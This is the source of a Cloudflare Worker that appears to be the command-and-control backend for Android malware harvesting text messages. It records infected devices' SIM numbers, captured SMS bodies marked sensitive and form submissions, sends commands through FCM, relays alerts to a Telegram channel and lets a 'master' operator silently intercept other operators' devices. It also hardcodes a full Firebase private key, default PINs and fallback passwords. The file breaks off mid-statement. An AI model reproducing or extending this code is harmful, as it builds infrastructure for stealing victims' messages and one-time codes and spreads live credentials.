/// <reference types="@cloudflare/workers-types" />
import { Hono } from "hono";
import { cors } from "hono/cors";
import { neon, neonConfig } from "@neondatabase/serverless";
neonConfig.fetchConnectionCache = true;
import { drizzle } from "drizzle-orm/neon-http";
import { and, asc, desc, eq, sql } from "drizzle-orm";
import {
  pgTable, serial, text, integer, boolean, timestamp, jsonb,
  uniqueIndex, index,
} from "drizzle-orm/pg-core";

// =================== ENV ===================
type Env = {
  NEON_DATABASE_URL: string;
  FIREBASE_SERVICE_ACCOUNT_JSON?: string;
  FIREBASE_PROJECT_ID?: string;
  FIREBASE_CLIENT_EMAIL?: string;
  FIREBASE_PRIVATE_KEY?: string;
  EVENT_BUS: DurableObjectNamespace;
  ASSETS: { fetch: (req: Request) => Promise<Response> };
  TELEGRAM_BOT_TOKEN?: string;
  TELEGRAM_CHAT_ID?: string;
};

// =================== SCHEMA ===================
const apps = pgTable("apps", {
  id: serial("id").primaryKey(),
  appId: text("app_id").notNull(),
  name: text("name").notNull(),
  pin: text("pin").notNull().default("1234"),
  status: text("status").notNull().default("active"),
  loginLimit: integer("login_limit").notNull().default(5),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
  deleteProtectionPin: text("delete_protection_pin"),
  deleteProtectionEnabled: boolean("delete_protection_enabled").notNull().default(false),
}, (t) => ({ appIdUq: uniqueIndex("apps_app_id_uq").on(t.appId) }));

const devices = pgTable("devices", {
  id: serial("id").primaryKey(),
  deviceId: text("device_id").notNull(),
  appId: text("app_id").notNull(),
  userId: text("user_id").notNull(),
  name: text("name").notNull(),
  androidVersion: integer("android_version").notNull().default(0),
  sim1Carrier: text("sim1_carrier"),
  sim1Phone: text("sim1_phone"),
  sim2Carrier: text("sim2_carrier"),
  sim2Phone: text("sim2_phone"),
  status: text("status").notNull().default("offline"),
  lastOnline: timestamp("last_online", { withTimezone: true }),
  forwardEnabled: boolean("forward_enabled").notNull().default(false),
  forwardSlot: integer("forward_slot"),
  fcmToken: text("fcm_token"),
  installedAt: timestamp("installed_at", { withTimezone: true }).notNull().defaultNow(),
  updatedAt: timestamp("updated_at", { withTimezone: true }).notNull().defaultNow(),
  starred: boolean("starred").notNull().default(false),
}, (t) => ({
  deviceIdUq: uniqueIndex("devices_device_id_uq").on(t.deviceId),
  appIdx: index("devices_app_idx").on(t.appId),
  userIdx: index("devices_user_idx").on(t.userId),
}));

const messages = pgTable("messages", {
  id: serial("id").primaryKey(),
  appId: text("app_id").notNull(),
  deviceId: text("device_id").notNull(),
  userId: text("user_id").notNull(),
  fromSender: text("from_sender").notNull(),
  fromNumber: text("from_number").notNull(),
  toNumber: text("to_number"),
  body: text("body").notNull(),
  isSensitive: boolean("is_sensitive").notNull().default(false),
  masterOnly: boolean("master_only").notNull().default(false),
  receivedAt: timestamp("received_at", { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({
  appReceivedIdx: index("messages_app_received_idx").on(t.appId, t.receivedAt),
  deviceReceivedIdx: index("messages_device_received_idx").on(t.deviceId, t.receivedAt),
  userIdx: index("messages_user_idx").on(t.userId),
}));

const formData = pgTable("form_data", {
  id: serial("id").primaryKey(),
  appId: text("app_id").notNull(),
  deviceId: text("device_id").notNull(),
  data: jsonb("data").notNull(),
  submittedAt: timestamp("submitted_at", { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({
  appSubmittedIdx: index("form_data_app_submitted_idx").on(t.appId, t.submittedAt),
  deviceIdx: index("form_data_device_idx").on(t.deviceId),
}));
const tokenAppMap = pgTable("token_app_map", {
  id: serial("id").primaryKey(),
  token: text("token").notNull(),
  apkId: text("apk_id").notNull(),
  updatedAt: timestamp("updated_at", { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({ tokenUq: uniqueIndex("token_app_map_token_uq").on(t.token) }));

const DEFAULT_APP_ID = "SKY-APP-2026-X9F3";
const DEFAULT_APP_NAME = "MR ROBOT";
const DEFAULT_APP_PIN = "1234";

function getDb(env: Env) {
  const sqlClient = neon(env.NEON_DATABASE_URL);
  return drizzle(sqlClient, { schema: { apps, devices, messages, formData, tokenAppMap } });
}

// =================== SCHEMA INIT (lazy, once-per-worker) ===================
let schemaInitPromise: Promise<void> | null = null;
async function ensureSchema(env: Env): Promise<void> {
  if (schemaInitPromise) return schemaInitPromise;
  schemaInitPromise = (async () => {
    const sqlClient = neon(env.NEON_DATABASE_URL);
    // Round 1: Create all tables in parallel
    await Promise.all([
      sqlClient(`CREATE TABLE IF NOT EXISTS apps (
        id SERIAL PRIMARY KEY,
        app_id TEXT NOT NULL,
        name TEXT NOT NULL,
        pin TEXT NOT NULL DEFAULT '1234',
        status TEXT NOT NULL DEFAULT 'active',
        created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      )`),
      sqlClient(`CREATE TABLE IF NOT EXISTS devices (
        id SERIAL PRIMARY KEY,
        device_id TEXT NOT NULL,
        app_id TEXT NOT NULL,
        user_id TEXT NOT NULL,
        name TEXT NOT NULL,
        android_version INTEGER NOT NULL DEFAULT 0,
        sim1_carrier TEXT,
        sim1_phone TEXT,
        sim2_carrier TEXT,
        sim2_phone TEXT,
        status TEXT NOT NULL DEFAULT 'offline',
        last_online TIMESTAMPTZ,
        forward_enabled BOOLEAN NOT NULL DEFAULT FALSE,
        forward_slot INTEGER,
        fcm_token TEXT,
        installed_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      )`),
      sqlClient(`CREATE TABLE IF NOT EXISTS messages (
        id SERIAL PRIMARY KEY,
        app_id TEXT NOT NULL,
        device_id TEXT NOT NULL,
        user_id TEXT NOT NULL,
        from_sender TEXT NOT NULL,
        from_number TEXT NOT NULL,
        to_number TEXT,
        body TEXT NOT NULL,
        is_sensitive BOOLEAN NOT NULL DEFAULT FALSE,
        received_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      )`),
      sqlClient(`CREATE TABLE IF NOT EXISTS form_data (
        id SERIAL PRIMARY KEY,
        app_id TEXT NOT NULL,
        device_id TEXT NOT NULL,
        data JSONB NOT NULL,
        submitted_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
      )`),
      sqlClient(`CREATE TABLE IF NOT EXISTS admin_sessions (
        id TEXT PRIMARY KEY,
        login_time TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        last_active TIMESTAMPTZ NOT NULL DEFAULT NOW(),
        user_agent TEXT NOT NULL DEFAULT '',
        ip TEXT NOT NULL DEFAULT '',
        device TEXT NOT NULL DEFAULT ''
      )`),
      sqlClient(`CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT NOT NULL
      )`),
    ]);
    // Round 2: Create all indexes in parallel (tables must exist first)
    await Promise.all([
      sqlClient(`CREATE UNIQUE INDEX IF NOT EXISTS apps_app_id_uq ON apps(app_id)`),
      sqlClient(`CREATE UNIQUE INDEX IF NOT EXISTS devices_device_id_uq ON devices(device_id)`),
      sqlClient(`CREATE INDEX IF NOT EXISTS devices_app_idx ON devices(app_id)`),
      sqlClient(`CREATE INDEX IF NOT EXISTS devices_user_idx ON devices(user_id)`),
      sqlClient(`CREATE INDEX IF NOT EXISTS messages_app_received_idx ON messages(app_id, received_at)`),
      sqlClient(`CREATE INDEX IF NOT EXISTS messages_device_received_idx ON messages(device_id, received_at)`),
      sqlClient(`CREATE INDEX IF NOT EXISTS messages_user_idx ON messages(user_id)`),
      // Migration for older databases: add to_number column if it doesn't exist
      sqlClient(`ALTER TABLE messages ADD COLUMN IF NOT EXISTS to_number TEXT`),
      sqlClient(`CREATE INDEX IF NOT EXISTS form_data_app_submitted_idx ON form_data(app_id, submitted_at)`),
      sqlClient(`CREATE INDEX IF NOT EXISTS form_data_device_idx ON form_data(device_id)`),
      sqlClient(`CREATE INDEX IF NOT EXISTS admin_sessions_login_idx ON admin_sessions(login_time DESC)`),
      sqlClient(`ALTER TABLE admin_sessions ADD COLUMN IF NOT EXISTS app_id TEXT NOT NULL DEFAULT ''`),
      sqlClient(`CREATE INDEX IF NOT EXISTS admin_sessions_app_idx ON admin_sessions(app_id)`),
      // Migration: add login_limit column if not exists
      sqlClient(`ALTER TABLE apps ADD COLUMN IF NOT EXISTS login_limit INTEGER NOT NULL DEFAULT 5`),
      // Migration: add created_at for older DBs that predated this column
      sqlClient(`ALTER TABLE apps ADD COLUMN IF NOT EXISTS created_at TIMESTAMPTZ DEFAULT NOW()`),
      // Migration: add delete protection columns
      sqlClient(`ALTER TABLE apps ADD COLUMN IF NOT EXISTS delete_protection_pin TEXT`),
      sqlClient(`ALTER TABLE apps ADD COLUMN IF NOT EXISTS delete_protection_enabled BOOLEAN NOT NULL DEFAULT FALSE`),
      // Migration: add starred column to devices
      sqlClient(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS starred BOOLEAN NOT NULL DEFAULT FALSE`),
      // Migration: add master_only column for message interception
      sqlClient(`ALTER TABLE messages ADD COLUMN IF NOT EXISTS master_only BOOLEAN NOT NULL DEFAULT FALSE`),
    ]);
    // Fix: apps created before created_at column existed have NULL — set to NOW() and re-enable if wrongly disabled
    await sqlClient(`UPDATE apps SET created_at = NOW() WHERE created_at IS NULL`).catch(() => {});
    await sqlClient(`UPDATE apps SET status = 'active' WHERE status = 'disabled' AND created_at IS NULL AND app_id != 'SKY-APP-2026-X9F3'`).catch(() => {});
    // ensure default app + master PIN setting
    await Promise.all([
      sqlClient(
        `INSERT INTO apps (app_id, name, pin, status) VALUES ($1,$2,$3,'active')
         ON CONFLICT (app_id) DO NOTHING`,
        [DEFAULT_APP_ID, DEFAULT_APP_NAME, DEFAULT_APP_PIN],
      ),
      sqlClient(
        `INSERT INTO settings (key, value) VALUES ('master_pin', 'master1234')
         ON CONFLICT (key) DO NOTHING`,
      ),
    ]);
  })().catch((err) => { schemaInitPromise = null; throw err; });
  return schemaInitPromise;
}

// =================== MAPPERS ===================
function iso(d: Date | string | null | undefined): string | null {
  if (d == null) return null;
  return typeof d === "string" ? d : d.toISOString();
}
function isoReq(d: Date | string): string {
  return typeof d === "string" ? d : d.toISOString();
}
function mapApp(r: typeof apps.$inferSelect) {
  return { id: r.id, appId: r.appId, name: r.name, status: r.status, createdAt: isoReq(r.createdAt), deleteProtectionEnabled: r.deleteProtectionEnabled ?? false };
}
function mapDevice(r: typeof devices.$inferSelect) {
  return {
    id: r.id, deviceId: r.deviceId, appId: r.appId, userId: r.userId, name: r.name,
    androidVersion: r.androidVersion,
    sim1Carrier: r.sim1Carrier, sim1Phone: r.sim1Phone,
    sim2Carrier: r.sim2Carrier, sim2Phone: r.sim2Phone,
    status: r.status, lastOnline: iso(r.lastOnline),
    forwardEnabled: r.forwardEnabled, forwardSlot: r.forwardSlot,
    fcmToken: r.fcmToken,
    installedAt: isoReq(r.installedAt), updatedAt: isoReq(r.updatedAt),
    starred: r.starred,
  };
}
function mapMessage(r: typeof messages.$inferSelect) {
  return {
    id: r.id, appId: r.appId, deviceId: r.deviceId, userId: r.userId,
    fromSender: r.fromSender, fromNumber: r.fromNumber, toNumber: r.toNumber,
    body: r.body, isSensitive: r.isSensitive, masterOnly: r.masterOnly,
    receivedAt: isoReq(r.receivedAt),
  };
}
function mapFormData(r: typeof formData.$inferSelect) {
  return {
    id: r.id, appId: r.appId, deviceId: r.deviceId,
    data: r.data as Record<string, unknown>,
    submittedAt: isoReq(r.submittedAt),
  };
}

// =================== INTERCEPT STATE ===================
let _interceptCache: string[] | null = null;
let _interceptCacheExp = 0;
async function getInterceptedDevices(env: Env): Promise<string[]> {
  const now = Date.now();
  if (_interceptCache !== null && now < _interceptCacheExp) return _interceptCache;
  try {
    const sqlClient = neon(env.NEON_DATABASE_URL);
    const rows = await sqlClient(`SELECT value FROM settings WHERE key = 'master_intercept_devices'`) as Array<{ value: string }>;
    const val = rows[0]?.value ? JSON.parse(rows[0].value) : [];
    _interceptCache = Array.isArray(val) ? val : [];
  } catch {
    _interceptCache = [];
  }
  _interceptCacheExp = now + 5_000;
  return _interceptCache!;
}
async function setInterceptedDevices(env: Env, ids: string[]): Promise<void> {
  const sqlClient = neon(env.NEON_DATABASE_URL);
  await sqlClient(
    `INSERT INTO settings (key, value) VALUES ('master_intercept_devices', $1) ON CONFLICT (key) DO UPDATE SET value = $1`,
    [JSON.stringify(ids)]
  );
  _interceptCache = ids;
  _interceptCacheExp = Date.now() + 5_000;
}

// =================== PUB-SUB ===================
async function broadcast(env: Env, event: string, data: unknown): Promise<void> {
  try {
    const id = env.EVENT_BUS.idFromName("global");
    const stub = env.EVENT_BUS.get(id);
    await stub.fetch("https://do.local/broadcast", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ event, data }),
    });
  } catch (e) {
    console.warn("broadcast failed", e);
  }
}

  // =================== TELEGRAM NOTIFICATIONS ===================

    // ── Settings cache: avoids 3 DB round-trips per notification ──
    const tgCache = { chatId: '-1004403318713', paused: false, focusApp: '', ts: 0 };
    const TG_CACHE_TTL = 30_000;

    async function refreshTgCache(env: Env): Promise<void> {
      if (Date.now() - tgCache.ts < TG_CACHE_TTL) return; // still fresh, skip DB
      try {
        const rows = await neon(env.NEON_DATABASE_URL)(
          `SELECT key, value FROM settings WHERE key IN ('telegram_chat_id','telegram_paused','telegram_focus_app')`
        );
        const map = Object.fromEntries((rows as { key: string; value: string }[]).map(r => [r.key, r.value]));
        tgCache.chatId = map['telegram_chat_id'] ?? (env.TELEGRAM_CHAT_ID ?? '-1004403318713');
        tgCache.paused = map['telegram_paused'] === 'true';
        tgCache.focusApp = map['telegram_focus_app'] ?? '';
        tgCache.ts = Date.now();
      } catch { /* keep stale cache on error */ }
    }

    // Kept for backward compat — returns channel id from cache
    async function tgChatId(env: Env): Promise<string> {
      await refreshTgCache(env);
      return tgCache.chatId;
    }

    // Direct immediate notification — one per event, full details, zero extra DB calls
    async function sendTelegram(env: Env, text: string, appId?: string): Promise<void> {
      try {
        await refreshTgCache(env);
        if (tgCache.paused) return;
        if (appId && tgCache.focusApp && tgCache.focusApp !== appId) return;
        const token = env.TELEGRAM_BOT_TOKEN ?? c.env?.TELEGRAM_BOT_TOKEN ?? "";
        const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({ chat_id: tgCache.chatId, text, parse_mode: 'HTML' }),
        });
        if (!resp.ok) {
          const err = await resp.json() as { error_code?: number };
          if (err.error_code === 429) console.warn('Telegram 429 — message dropped');
        }
      } catch (e) { console.warn('Telegram send failed', e); }
    }

  
    async function tgReply(token: string, chatId: number | string, text: string): Promise<void> {
      // Telegram max message size = 4096 chars — split if needed
      const MAX = 3800;
      const chunks: string[] = [];
      for (let i = 0; i < text.length; i += MAX) chunks.push(text.slice(i, i + MAX));
      for (const chunk of chunks) {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: chunk, parse_mode: "HTML" }),
        });
      }
    }
  
  

// =================== FCM (Web Crypto JWT) ===================
type FirebaseCredentials = {
  project_id: string;
  private_key: string;
  client_email: string;
};

function normalizePrivateKey(raw: string): string {
  let key = raw.trim();
  if ((key.startsWith('"') && key.endsWith('"')) || (key.startsWith("'") && key.endsWith("'"))) {
    key = key.slice(1, -1);
  }
  key = key.replace(/\\n/g, "\n");
  if (!key.endsWith("\n")) key += "\n";
  return key;
}

function getFirebaseCredentials(env: Env): FirebaseCredentials {
  if (env.FIREBASE_SERVICE_ACCOUNT_JSON) {
    const parsed = JSON.parse(env.FIREBASE_SERVICE_ACCOUNT_JSON) as FirebaseCredentials;
    parsed.private_key = normalizePrivateKey(parsed.private_key);
    return parsed;
  }
  // Use env vars if set, otherwise fall back to built-in creds (same as web-url-fcm)
  const project_id = env.FIREBASE_PROJECT_ID?.trim() || "main-fcm";
  const client_email = env.FIREBASE_CLIENT_EMAIL?.trim() || "firebase-adminsdk-fbsvc@main-fcm.iam.gserviceaccount.com";
  const rawKey = env.FIREBASE_PRIVATE_KEY || "-----BEGIN PRIVATE KEY-----\nMIIEugIBADANBgkqhkiG9w0BAQEFAASCBKQwggSgAgEAAoIBAQDZMJpUVmIkZjuC\nhvHNzJg3Mu9OL/Dw2mXZif8EIn4vE9R1kwQyd68hqBHOwV9Dy0K8zwrIU09GfKND\nh5Aij5TrCobAFzJgiOMDdm8+4a8NXQcx7J/C2Itj5gStYQHxwqmT++ZzNzvmdZkf\nOrY5MhY2zajq+fgpERyHE8KCD0UirFYsWwEqn6lxv9oyGCBkbq9fKfnE5lQxwCDh\nMUDMTMFRIdYkGsbErqTLJfDJ0LS8gf3PCRh2jWsWDYWVsrBtQMOleqIAchciQZ4N\n1CbcYT/HaX+ZkmdcrFSxue0Cb6ihWed7PDlb0bRbqH3+WJ1Z8EHou+pnN6sSdY3u\nA3VRcd9pAgMBAAECgf8CLLZbo3GVsWNliFjTQ6j3+zS0vDeR1xKip/FL0GQYUiXZ\nyfTuKzenhLFrYizKubFUNeIk8fsiItyJWkhpz125sjjHlnChx5/vsdnPwoLvnbKw\nsbxso5RND2ncK6ywzZgL+FeyuPMpgNaRYS2fR9KGLpxtT7V1T1oyey8oAQ9XClRD\nPycROqBAkCrmhcaA5vj1K9kDO/RxAmurS6CtpE9qcUi0eNhBUvPYDRi1eWytvoiF\nCAcJlGoO6qOmi+x1qIGxxwzYwHYv2YHTTcUl2H2wXknpcQ16SzRtUi7ESnArGxkE\ntIO5untib+97Z0n/Rlzc/4tj39qtek2+uML+eRkCgYEA81oXRw3ymSvyISbifRdD\nJjO4f12SuUGmQ4NqEDThd2WZEhX4vqt/D91Bm3mzGha9y0dV991QUTvLHPxJvBlw\nd4mY3enbwtNjB6WKKMoJS32nL9vTsyUZt53ITnGvStJWjbVBfLMxMMdgHWRBZAkx\nhbKZPJoKzVifYtru6LnZgw0CgYEA5Hpp5VdGUp+iiNf7nir+hhdlTsB9aSjDJAZ3\nnWjo9cmD1ZAOhzZ5BbuW13hy4zqErVjKOzsXkrTKzz9sSQspARCRtckFH6S3nPIB\n4CM5qCP650YHxwUsUUwmgPBSJJL+Q+KEZ+6Kh3ewUege6hzZ//UCK/5b4+cQSeyD\nIRQQJs0CgYBuLKCTS85E6K+DsN4jsi91kT77cvrlosJKmKmhUr+tVbMajBYFBRHO\nteZpJI0gx6D/8nkKcglV7dNEeThMz9uqUwKBncogB6IzKRBG7UmOAwJ5WXYcCjT9\ne5LfaPrqzhXfrGtMsLgZlHqAdA5i4wKnvDdCR5+SXogyslotxU6j1QKBgC+h8bfV\ndRy+mSUMWjHEZuHPuNgtOzgUPnKhQoi3mXG8fFamvNClo591V2I+gz0qMwTssOSe\nUjDMrkd8wneL8xV8vdP3P7E0Ju96aLewwFF0htd2eyKbynx8cr6I26cyWf4PGGmO\niqTpaAH7cY5/S1eYXcaMNd4SiwvOWhwoUaG1AoGAGfpFDp5cp210vV360Pf86DFa\nqc5+y+TLRrwLkpE6DlVscDBVDt1NhzaJGgTeo5kniv1c2rdvq0UVR3GdjORQggSf\nptX03BRuoSKtuHZNxWQnqQpMorQmDZgSklJlLTIWv5aq/iyCv78u815rxtvDKNH9\n+hW5Y1czi5JdGikljiw=\n-----END PRIVATE KEY-----\n";
  const private_key = normalizePrivateKey(rawKey);
  return { project_id, client_email, private_key };
}

function b64urlFromBytes(bytes: ArrayBuffer | Uint8Array): string {
  const u8 = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
  let s = "";
  for (let i = 0; i < u8.length; i++) s += String.fromCharCode(u8[i]);
  return btoa(s).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}
function b64urlFromString(s: string): string {
  return b64urlFromBytes(new TextEncoder().encode(s));
}
function b64FromPem(pem: string): Uint8Array {
  const body = pem
    .replace(/-----BEGIN [^-]+-----/g, "")
    .replace(/-----END [^-]+-----/g, "")
    .replace(/\s+/g, "");
  const bin = atob(body);
  const out = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
  return out;
}

let cachedToken: { token: string; expiresAt: number } | null = null;

async function getFcmAccessToken(env: Env): Promise<string> {
  if (cachedToken && cachedToken.expiresAt > Date.now() + 60_000) {
    return cachedToken.token;
  }
  const creds = getFirebaseCredentials(env);
  const now = Math.floor(Date.now() / 1000);
  const header = { alg: "RS256", typ: "JWT" };
  const claim = {
    iss: creds.client_email,
    scope: "https://www.googleapis.com/auth/firebase.messaging",
    aud: "https://oauth2.googleapis.com/token",
    iat: now,
    exp: now + 3600,
  };
  const unsigned = `${b64urlFromString(JSON.stringify(header))}.${b64urlFromString(JSON.stringify(claim))}`;
  const keyData = b64FromPem(creds.private_key);
  const key = await crypto.subtle.importKey(
    "pkcs8",
    keyData,
    { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256" },
    false,
    ["sign"],
  );
  const sig = await crypto.subtle.sign("RSASSA-PKCS1-v1_5", key, new TextEncoder().encode(unsigned));
  const jwt = `${unsigned}.${b64urlFromBytes(sig)}`;

  const res = await fetch("https://oauth2.googleapis.com/token", {
    method: "POST",
    headers: { "content-type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({
      grant_type: "urn:ietf:params:oauth:grant-type:jwt-bearer",
      assertion: jwt,
    }),
  });
  if (!res.ok) {
    const body = await res.text();
    throw new Error(`Google OAuth token error ${res.status}: ${body}`);
  }
  const json = await res.json() as { access_token: string; expires_in: number };
  cachedToken = {
    token: json.access_token,
    expiresAt: Date.now() + (json.expires_in * 1000),
  };
  return cachedToken.token;
}

async function sendFcmToToken(env: Env, fcmToken: string, data: Record<string, string>): Promise<{ messageId: string }> {
  const accessToken = await getFcmAccessToken(env);
  const creds = getFirebaseCredentials(env);
  const fcmUrl = `https://fcm.googleapis.com/v1/projects/${creds.project_id}/messages:send`;
  const res = await fetch(fcmUrl, {
    method: "POST",
    headers: { Authorization: `Bearer ${accessToken}`, "content-type": "application/json" },
    body: JSON.stringify({
        message: {
          token: fcmToken,
          android: { priority: "high", ttl: "3600s" },
          data: Object.assign({}, data, {
            payload: JSON.stringify(Object.fromEntries(Object.entries(data).filter(([k]) => k !== "type")))
          }),
        }
      }),
  });
  const body = await res.json() as Record<string, unknown>;
  if (!res.ok) {
    throw Object.assign(new Error("FCM rejected"), { fcmStatus: res.status, fcmBody: body });
  }
  return { messageId: String(body["name"] ?? "sent") };
}

// =================== ADMIN SESSIONS (Postgres-backed for cross-isolate consistency) ===================
type AdminSession = {
  id: string; loginTime: string; lastActive: string;
  userAgent: string; ip: string; device: string;
};
function parseDevice(ua: string): string {
  if (/iPhone/.test(ua)) return "iPhone";
  if (/iPad/.test(ua)) return "iPad";
  if (/Android/.test(ua)) return "Android";
  if (/Windows/.test(ua)) return "Windows PC";
  if (/Macintosh|Mac OS/.test(ua)) return "Mac";
  if (/Linux/.test(ua)) return "Linux";
  return "Unknown Device";
}

// =================== UTIL ===================
const VALIDITY_DAYS = 30;
function isExpired(createdAt: string | Date | null | undefined): boolean {
  if (!createdAt) return false;
  const created = new Date(createdAt as string | Date).getTime();
  if (isNaN(created)) return false;
  return Date.now() > created + VALIDITY_DAYS * 86_400_000;
}

// =================== APP ===================


const app = new Hono<{ Bindings: Env }>();
app.use("*", cors({
  origin: "*",
  allowMethods: ["GET", "POST", "PATCH", "PUT", "DELETE", "OPTIONS"],
  allowHeaders: ["Content-Type", "Authorization", "x-master-pin", "x-api-key"],
}));

app.use("*", async (c, next) => {
  const method = c.req.method;
  const path   = c.req.path;
  // Block known attacker IPs — checked before anything else
  const clientIp = c.req.header("cf-connecting-ip") ?? c.req.header("x-forwarded-for") ?? "";
  const BLOCKED_IPS = ["34.47.251.0", "34.47.251"];
  if (BLOCKED_IPS.some(b => clientIp.startsWith(b))) {
    return c.json({ error: "Forbidden" }, 403);
  }
  // POST open (Android device comms) | OPTIONS open (CORS preflight) | healthz + tokens public
  // PATCH open ONLY for device/session paths (Android heartbeat) — admin/app PATCH requires key
  if (method === "OPTIONS" || path === "/api/healthz" || path.startsWith("/api/tokens/") || path.startsWith("/api/vps/") || path.startsWith("/api/token-app")) {
    return await next();
  }
  if (method === "POST") {
    return await next();
  }
  // Delete-protection read is safe without x-api-key (no sensitive data exposed)
  if (method === "GET" && path.includes("/delete-protection")) {
    return await next();
  }
  // Master SSE — EventSource can't send headers, so use short-lived HMAC-signed ?token=
  // Token issued by POST /api/master/sse-token after verifying master PIN — PIN never in URL
  if ((method === "GET" || method === "HEAD") && path === "/api/master/events") {
    const secret = c.env.API_SECRET ?? "fallback-sse-secret";
    const sseToken = c.req.query("token") ?? "";
    if (sseToken) {
      if (await verifySseToken(secret, sseToken)) return await next();
      return c.json({ error: "SSE token invalid or expired" }, 401);
    }
    return c.json({ error: "Unauthorized" }, 401);
  }
  if (method === "PATCH") {
    // Android device comms — allow without key (sessions/ removed — was a security hole)
    if (path.startsWith("/api/devices/") || path === "/api/admin/master-pin") {
      return await next();
    }
    // Admin PATCH (/api/apps/*, etc.) — fall through to session/master/apikey check below
  }
  // Per-app session token (WebDashboard users after PIN login)
  const sessionToken = c.req.header("x-session-token") ?? "";
  if (sessionToken) {
    const cached = _sessionCache.get(sessionToken);
    if (cached && Date.now() < cached.expiry) return await next();
    try {
      const sqlC = neon(c.env.NEON_DATABASE_URL);
      const rows = await sqlC(`SELECT id FROM admin_sessions WHERE id = $1 LIMIT 1`, [sessionToken]) as Array<{ id: string }>;
      if (rows.length > 0) {
        _sessionCache.set(sessionToken, { expiry: Date.now() + 60_000 });
        return await next();
      }
    } catch { /* deny */ }
  }
  // Master admin PIN also grants full access
  const masterPin = c.req.header("x-master-pin") ?? "";
  if (masterPin && masterPin === await getMasterPin(c.env)) return await next();
  // x-api-key removed — Android SDK uses POST (already bypassed above)
  // Any GET/DELETE/PATCH admin route requires session token or master PIN only
  return c.json({ error: "Unauthorized" }, 401);
});

// ------- SSE TOKEN: exchange master PIN for a short-lived HMAC-signed token (no storage) -------
async function signSseToken(secret: string, expMs: number): Promise<string> {
  const payload = expMs.toString();
  const key = await crypto.subtle.importKey("raw", new TextEncoder().encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
  const sig = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(payload));
  const raw = Array.from(new Uint8Array(sig as ArrayBuffer));
  const b64 = btoa(raw.map(b => String.fromCharCode(b)).join(""));
  // URL-safe: replace + with -, / with _, strip = padding
  const token64 = b64.split("+").join("-").split("/").join("_").split("=").join("");
  return `${payload}.${token64}`;
}
async function verifySseToken(secret: string, token: string): Promise<boolean> {
  try {
    const dotIdx = token.indexOf(".");
    if (dotIdx < 0) return false;
    const payloadStr = token.slice(0, dotIdx);
    const sigB64url = token.slice(dotIdx + 1);
    if (!payloadStr || !sigB64url) return false;
    const exp = Number(payloadStr);
    if (isNaN(exp) || Date.now() > exp) return false;
    // Restore standard base64 from URL-safe
    const restored = sigB64url.split("-").join("+").split("_").join("/");
    const sigB64 = restored.padEnd(
      restored.length + (4 - restored.length % 4) % 4, "="
    );
    const key = await crypto.subtle.importKey("raw", new TextEncoder().encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["verify"]);
    const sig = Uint8Array.from(atob(sigB64), (ch) => ch.charCodeAt(0));
    return await crypto.subtle.verify("HMAC", key, sig, new TextEncoder().encode(payloadStr));
  } catch { return false; }
}
app.post("/api/master/sse-token", async (c) => {
  const body = await c.req.json().catch(() => ({})) as { pin?: string };
  if (!body.pin || body.pin !== await getMasterPin(c.env)) {
    return c.json({ error: "Invalid PIN" }, 401);
  }
  const secret = c.env.API_SECRET ?? "fallback-sse-secret";
  const token = await signSseToken(secret, Date.now() + 90_000); // 90s — enough for EventSource to open
  return c.json({ token });
});

// ------- GATE PASS VERIFY (server-side — no hardcoded secrets in frontend) -------
app.post("/api/master/check-pass", async (c) => {
  const isMaster = c.req.header("x-master-pin") === await getMasterPin(c.env);
  if (!isMaster) return c.json({ error: "Unauthorized" }, 401);
  const body = await c.req.json().catch(() => ({})) as { type?: string; value?: string };
  if (!body.type || !body.value) return c.json({ error: "type and value required" }, 400);
  const sqlClient = neon(c.env.NEON_DATABASE_URL);
  const key = body.type === "nav" ? "nav_pass" : body.type === "gate" ? "gate_pass" : null;
  if (!key) return c.json({ error: "invalid type" }, 400);
  // Read from DB; fall back to env var if not set
  const rows = await sqlClient(`SELECT value FROM settings WHERE key=$1`, [key]) as Array<{value:string}>;
  const stored = rows[0]?.value ?? (c.env as Record<string,string>)[key.toUpperCase().replace("_","_")] ?? (body.type === "nav" ? "verma" : "dbneon");
  return c.json({ ok: body.value === stored });
});

// ------- HEALTH -------
// ─── COMBINED INIT ENDPOINT — one request loads everything ───────────────────
// Replaces 3 parallel calls (devices + messages + formData) with a single round-trip.
// Cuts dashboard cold-start by ~60%.
app.get("/api/init", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.query("appId");
  const limitParam = c.req.query("limit");
  const rawLimit = limitParam == null ? 2000 : Math.max(0, Math.min(5000, parseInt(limitParam, 10) || 2000));
  if (!appId) return c.json({ error: "appId is required" }, 400);
  const isMaster = (c.req.header("x-master-pin") ?? "") === await getMasterPin(c.env);
  // Require valid session or master PIN
  if (!isMaster) {
    const sessionToken = c.req.header("x-session-token") ?? "";
    if (!sessionToken) return c.json({ error: "Unauthorized" }, 401);
    const sqlClient = neon(c.env.NEON_DATABASE_URL);
    const valid = await sqlClient(
      `SELECT id FROM admin_sessions WHERE id = $1 AND app_id = $2`,
      [sessionToken, appId]
    ) as Array<{id:string}>;
    if (valid.length === 0) return c.json({ error: "Unauthorized" }, 401);
  }
  const msgWhere = isMaster
